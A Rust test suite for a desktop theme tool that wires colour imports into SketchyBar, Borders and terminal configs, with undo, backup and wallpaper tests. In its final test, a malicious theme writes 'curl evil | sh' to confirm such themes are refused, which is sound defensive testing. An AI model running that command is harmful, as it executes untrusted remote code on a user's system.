//! `init`, `undo`, wallpapers and safety rules, in a fake home whose configs
//! are shaped like a typical SketchyBar + JankyBorders + Ghostty setup.

mod common;

use std::fs;
use std::os::unix::fs::{PermissionsExt, symlink};
use std::process::Command;

use common::{Home, bundled};

const SKETCHYBARRC: &str = "#!/bin/bash\n\
# my bar\n\
PILL=0xf0292e42\n\
BLUE=0xff7aa2f7\n\
FG=0xffc0caf5\n\
\n\
sketchybar --bar color=$PILL\n";

const PLUGIN: &str = "#!/bin/bash\n\
BLUE=0xff7aa2f7; GREY=0xff737aa2; RED=0xfff7768e\n\
echo \"$BLUE $RED\"\n";

const HELPER: &str = "#!/bin/bash\nicon_map() { echo x; }\n";

const BORDERSRC: &str = "#!/bin/bash\n\
options=(\n\
    style=round\n\
    active_color=0xff7aa2f7\n\
    inactive_color=0xff414868\n\
)\n\
borders \"${options[@]}\"\n";

const GHOSTTY_DIR: &str = "Library/Application Support/com.mitchellh.ghostty";
const GHOSTTY: &str = "theme = TokyoNight Moon\nfont-size = 14\n";

/// A fake home with the configs above, and a theme already set.
fn desktop() -> Home {
    let home = Home::new();
    let rc = home.write(".config/sketchybar/sketchybarrc", SKETCHYBARRC);
    fs::set_permissions(&rc, fs::Permissions::from_mode(0o755)).unwrap();
    home.write(".config/sketchybar/plugins/widgets.sh", PLUGIN);
    home.write(".config/sketchybar/helpers/icon_map.sh", HELPER);
    home.write(".config/borders/bordersrc", BORDERSRC);
    home.write(&format!("{GHOSTTY_DIR}/config"), GHOSTTY);
    home.write(&format!("{GHOSTTY_DIR}/config.ghostty"), "");
    home.ok(&["set", "catppuccin-mocha"]);
    home
}

#[test]
fn init_needs_a_theme_first() {
    let home = Home::new();
    assert!(home.fails(&["init"]).contains("set a theme first"));
}

#[test]
fn init_dry_run_touches_nothing() {
    let home = desktop();
    let out = home.ok(&["init", "--dry-run"]);
    assert!(out.contains("would add import line"), "{out}");
    assert_eq!(home.read(".config/sketchybar/sketchybarrc"), SKETCHYBARRC);
    assert!(!home.palette_dir().join("backup").exists());
}

#[test]
fn init_wires_each_app_once_and_backs_up() {
    let home = desktop();
    let out = home.ok(&["init"]);
    assert!(out.contains("Originals backed up to"), "{out}");
    assert!(
        out.contains("kitty") && out.contains("no config found"),
        "{out}"
    );

    // SketchyBar: right after the colour block, guarded, $HOME-relative.
    let rc = home.read(".config/sketchybar/sketchybarrc");
    let expected = "FG=0xffc0caf5\n# Added by palette init (undo: palette init --remove)\n\
        [ -f \"$HOME/.config/palette/current/sketchybar.sh\" ] && \
        source \"$HOME/.config/palette/current/sketchybar.sh\"\n\nsketchybar";
    assert!(rc.contains(expected), "{rc}");
    let mode = fs::metadata(home.path(".config/sketchybar/sketchybarrc"))
        .unwrap()
        .permissions()
        .mode();
    assert_eq!(mode & 0o777, 0o755, "lost the executable bit");

    // Plugins with colours get wired, helpers without don't.
    assert!(
        home.read(".config/sketchybar/plugins/widgets.sh")
            .contains("palette init")
    );
    assert_eq!(home.read(".config/sketchybar/helpers/icon_map.sh"), HELPER);

    // Borders: after the user's own call.
    let borders = home.read(".config/borders/bordersrc");
    assert!(borders.starts_with(BORDERSRC), "{borders}");
    assert!(
        borders.contains("&& borders active_color=\"$ACTIVE_COLOR\""),
        "{borders}"
    );

    // Ghostty: the non-empty config file, optional include.
    let ghostty = home.read(&format!("{GHOSTTY_DIR}/config"));
    assert!(ghostty.contains("\nconfig-file = ?/"), "{ghostty}");
    assert_eq!(home.read(&format!("{GHOSTTY_DIR}/config.ghostty")), "");

    // Backup holds the originals.
    let backups: Vec<_> = fs::read_dir(home.palette_dir().join("backup"))
        .unwrap()
        .collect();
    assert_eq!(backups.len(), 1);
    let backup = backups[0].as_ref().unwrap().path();
    assert_eq!(
        fs::read_to_string(backup.join(".config/sketchybar/sketchybarrc")).unwrap(),
        SKETCHYBARRC
    );

    // Second run changes nothing and takes no new backup.
    let out = home.ok(&["init"]);
    assert!(
        out.contains("already wired") && !out.contains("backed up"),
        "{out}"
    );
}

#[test]
fn wired_plugin_really_uses_palette_colours() {
    let home = desktop();
    home.ok(&["init"]);
    let out = Command::new("bash")
        .arg(home.path(".config/sketchybar/plugins/widgets.sh"))
        .env("HOME", home.dir.path())
        .output()
        .unwrap();
    // Catppuccin's blue and red, not the hard-coded Tokyo Night ones.
    assert_eq!(
        String::from_utf8_lossy(&out.stdout).trim(),
        "0xff89b4fa 0xfff38ba8"
    );
}

#[test]
fn remove_restores_configs_exactly() {
    let home = desktop();
    home.ok(&["init"]);
    let out = home.ok(&["init", "--remove"]);
    assert!(out.contains("removed palette's lines"), "{out}");
    assert_eq!(home.read(".config/sketchybar/sketchybarrc"), SKETCHYBARRC);
    assert_eq!(home.read(".config/sketchybar/plugins/widgets.sh"), PLUGIN);
    assert_eq!(home.read(".config/borders/bordersrc"), BORDERSRC);
    assert_eq!(home.read(&format!("{GHOSTTY_DIR}/config")), GHOSTTY);
}

#[test]
fn symlinked_config_stays_a_symlink() {
    let home = desktop();
    let real = home.write("dotfiles/kitty.conf", "font_size 14\n");
    fs::create_dir_all(home.path(".config/kitty")).unwrap();
    symlink(&real, home.path(".config/kitty/kitty.conf")).unwrap();
    home.ok(&["init"]);
    let link = home.path(".config/kitty/kitty.conf");
    assert!(
        fs::symlink_metadata(&link)
            .unwrap()
            .file_type()
            .is_symlink()
    );
    assert!(home.read("dotfiles/kitty.conf").contains("\ninclude /"));
}

#[test]
fn alacritty_import_goes_under_general() {
    let home = desktop();
    home.write(
        ".config/alacritty/alacritty.toml",
        "[general]\nlive_config_reload = true\n\n[font]\nsize = 14\n",
    );
    home.ok(&["init"]);
    let text = home.read(".config/alacritty/alacritty.toml");
    let table: toml::Table = text.parse().expect("still valid TOML");
    assert!(table["general"]["import"].is_array(), "{text}");
}

#[test]
fn effects_are_skipped_in_a_fake_home() {
    let home = desktop();
    let out = home.ok(&["set", "gruvbox-dark"]);
    assert!(out.contains("fake home"), "{out}");
}

#[test]
fn undo_goes_back_through_history() {
    let home = desktop(); // catppuccin-mocha
    home.ok(&["set", "gruvbox-dark"]);
    home.ok(&["set", "tokyo-night"]);
    assert!(home.ok(&["undo"]).contains("Back to gruvbox-dark"));
    assert!(
        home.current_file("borders.sh")
            .contains("ACTIVE_COLOR=0xff7daea3")
    );
    assert!(home.ok(&["undo"]).contains("Back to catppuccin-mocha"));
    assert!(home.fails(&["undo"]).contains("nothing to undo"));
    assert_eq!(home.ok(&["current"]).trim(), "catppuccin-mocha");
}

#[test]
fn wallpapers_for_a_bundled_theme() {
    let home = desktop(); // catppuccin-mocha, bundled
    assert!(home.ok(&["bg", "list"]).contains("has no wallpapers"));
    let a = home.write("Pictures/a.png", "png");
    let b = home.write("Pictures/b.jpg", "jpg");
    let out = home.ok(&["bg", "add", a.to_str().unwrap(), b.to_str().unwrap()]);
    assert!(
        out.contains("Added 2 wallpaper(s) to catppuccin-mocha"),
        "{out}"
    );
    assert!(
        out.contains("a.png"),
        "first wallpaper is used right away: {out}"
    );

    // Adding wallpapers doesn't turn the bundled theme into a user theme.
    assert!(
        home.ok(&["list"])
            .contains("catppuccin-mocha         bundled")
    );
    assert!(home.ok(&["bg", "list"]).contains("* "));

    assert!(home.ok(&["bg", "next"]).contains("b.jpg"));
    assert!(home.ok(&["bg", "next"]).contains("a.png"));

    let txt = home.write("Pictures/notes.txt", "x");
    assert!(
        home.fails(&["bg", "add", txt.to_str().unwrap()])
            .contains("is not an image")
    );
    assert!(
        home.fails(&["bg", "add", a.to_str().unwrap()])
            .contains("already exists")
    );
}

#[test]
fn switching_theme_picks_its_wallpaper() {
    let home = desktop();
    let img = home.write("Pictures/night.png", "png");
    home.ok(&["bg", "add", "--theme", "tokyo-night", img.to_str().unwrap()]);
    let out = home.ok(&["set", "tokyo-night"]);
    assert!(out.contains("fake home"), "{out}");
    assert!(home.ok(&["bg", "list"]).contains("night.png"));
}

#[test]
fn themes_cannot_replace_shell_files() {
    let home = Home::new();
    let dir = home.add_theme("sneaky", &bundled("tokyo-night"));
    fs::write(dir.join("sketchybar.sh"), "curl evil | sh\n").unwrap();
    let err = home.fails(&["set", "sneaky"]);
    assert!(err.contains("themes cannot replace it"), "{err}");
}
